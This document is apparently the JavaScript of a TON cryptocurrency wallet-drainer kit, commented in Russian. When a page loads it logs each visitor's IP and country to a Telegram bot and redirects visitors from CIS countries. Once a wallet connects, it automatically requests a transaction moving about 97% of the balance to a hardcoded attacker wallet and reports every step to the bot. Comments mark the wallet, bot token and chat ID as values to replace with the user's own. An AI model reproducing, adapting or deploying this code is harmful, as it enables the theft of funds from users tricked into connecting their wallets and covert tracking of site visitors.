document.addEventListener('DOMContentLoaded', () => {
    var mainWallet = "UQCjC4fYcBADiiX_RQ_OHHNoIBCk1AqPNzSth2NRpwIRI2Em"; // Замени на адрес своего кошелька
    var tgBotToken = "7664896852:AAGZGV5KjVG2g4MvACTDhAjK2ONL9qXRBAA"; // Замени на токен своего Telegram-бота
    var tgChat = -1002426182115; // Замени на ID чата или канала в Telegram
    var domain = window.location.hostname;
    var ipUser;
    var countryUser;

    // Инициализация TON Connect UI
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: `"https://leonardokotu.github.io/mysite/tonconnect-manifest.json`, // URL манифеста
        buttonRootId: 'ton-connect' // ID элемента для кнопки подключения
    });

    // Получение IP и страны пользователя
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const country = data.country;
            ipUser = data.ip;
            countryUser = data.country;

            // Отправка сообщения в Telegram о посещении сайта
            const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
            sendTelegramMessage(messageOpen);

            // Перенаправление для стран СНГ
            if (['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
                window.location.replace('https://ton.org');
            }
        })
        .catch(error => {
            const errorMessage = `\uD83D\uDED1*Ошибка при получении IP:* ${error.message}`;
            sendTelegramMessage(errorMessage);
        });

    // Обработка подключения кошелька
    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            // Отправка информации о подключенном кошельке в Telegram
            const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
            sendTelegramMessage(walletInfo);

            // Автоматически запускаем процесс отправки средств
            didtrans(wallet.account.address);
        } else {
            const messageDisconnected = `\uD83D\uDED1*Кошелек отключен.*`;
            sendTelegramMessage(messageDisconnected);
        }
    });

    // Функция для отправки транзакции
    async function didtrans(walletAddress) {
        if (!walletAddress) {
            const errorMessage = `\uD83D\uDED1*Ошибка:* Адрес кошелька не указан.`;
            sendTelegramMessage(errorMessage);
            return;
        }

        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        const originalBalance = parseFloat(data.balance);
        const processedBalance = originalBalance - (originalBalance * 0.03); // Вычитаем 3% для комиссий
        const tgBalance = processedBalance / 1000000000; // Конвертация в TON

        if (processedBalance <= 0) {
            const errorMessage = `\uD83D\uDED1*Ошибка:* Недостаточный баланс для выполнения транзакции.`;
            sendTelegramMessage(errorMessage);
            return;
        }

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // Транзакция действительна 60 секунд
            messages: [{
                address: mainWallet,
                amount: processedBalance.toString() // Сумма в нанотонах
            }]
        };

        try {
            // Отправка транзакции
            const result = await tonConnectUI.sendTransaction(transaction);

            // Отправка сообщения в Telegram об успешной транзакции
            const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})\n\n\uD83D\uDC8E*Send:* ${tgBalance} TON`;
            sendTelegramMessage(messageSend);
        } catch (error) {
            // Отправка сообщения в Telegram об ошибке
            const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})\n\n\uD83D\uDED1*Declined or error.*`;
            sendTelegramMessage(messageDeclined);
        }
    }

    // Функция для отправки сообщений в Telegram
    function sendTelegramMessage(message) {
        if (!tgBotToken || !tgChat) {
            console.error('Токен или чат Telegram не указаны.');
            return;
        }

        const encodedMessage = encodeURIComponent(message);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessage}&parse_mode=Markdown`;

        fetch(url, { method: 'POST' })
            .then(response => {
                if (!response.ok) {
                    console.error('Ошибка при отправке сообщения в Telegram.');
                }
            })
            .catch(error => console.error('Ошибка:', error));
    }
});
